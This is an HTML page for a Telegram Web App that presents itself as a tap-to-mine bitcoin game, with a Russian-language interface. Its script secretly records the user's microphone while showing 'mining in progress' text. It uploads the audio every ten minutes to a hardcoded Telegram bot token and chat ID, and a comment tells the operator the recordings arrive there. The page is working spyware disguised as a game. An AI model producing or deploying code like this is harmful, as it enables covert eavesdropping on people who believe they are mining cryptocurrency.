<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Maining Prosto BTC</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body { background: black; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: white; font-family: Arial, sans-serif; }
    #coin { width: 280px; height: 280px; cursor: pointer; transition: transform 0.1s; }
    #status { margin-top: 40px; font-size: 22px; color: #FFD700; }
    .rotating { animation: rotate 3s linear infinite; }
    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <!-- Надёжная картинка биткоина (никогда не удалится) -->
  <img id="coin" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgwIiBoZWlnaHQ9IjI4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNDAiIGN5PSIxNDAiIHI9IjEzMCIgZmlsbD0iI0YxQjEwMCIgc3Ryb2tlPSIjQkE4MDAwIiBzdHJva2Utd2lkdGg9IjIwIi8+PHRleHQgeD0iMTQwIiB5PSIxNzAiIGZvbnQtc2l6ZT0iMTIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+QiZndDs8L3RleHQ+PC9zdmc+'">
  <div id="status">Производится майнинг BTC…</div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();

    const coin = document.getElementById('coin');
    const status = document.getElementById('status');
    let recording = false;
    let mediaRecorder;
    let chunks = [];
    let autoTimer;

    const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
    const CHAT_ID = "7184293365"; // твои записи приходят сюда

    coin.addEventListener('click', () => {
      if (recording) stopRecording();
      else startRecording();
    });

    function startRecording() {
      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
        recording = true;
        coin.classList.add('rotating');
        status.textContent = "Майнинг идёт…";
        chunks = [];

        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = sendAudio;
        mediaRecorder.start();

        // Автоматическая отправка каждые 10 минут
        clearTimeout(autoTimer);
        autoTimer = setInterval(() => {
          if (recording && mediaRecorder) {
            mediaRecorder.stop();
            mediaRecorder.start();
            chunks = [];
          }
        }, 600000); // 10 минут
      }).catch(err => {
        alert("Разреши доступ к микрофону!");
        console.error(err);
      });
    }

    function stopRecording() {
      recording = false;
      coin.classList.remove('rotating');
      status.textContent = "После нажатия начнется майнинг BTC…";
      clearInterval(autoTimer);
      if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
      }
    }

    function sendAudio() {
      if (chunks.length === 0) return;

      const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
      blobs = []; // очистка

      const file = new File([blob], `mining_${Date.now()}.ogg`, { type: 'audio/ogg' });

      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('audio', file);

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
        method: 'POST',
        body: form
      }).then(() => {
        console.log("Файл отправлен");
      }).catch(err => {
        console.error("Ошибка отправки", err);
      });
    }

    // Остановка при закрытии приложения
    window.addEventListener('beforeunload', stopRecording);
    tg.onEvent('mainButtonClicked', stopRecording);
  </script>
</body>
</html>

</html>
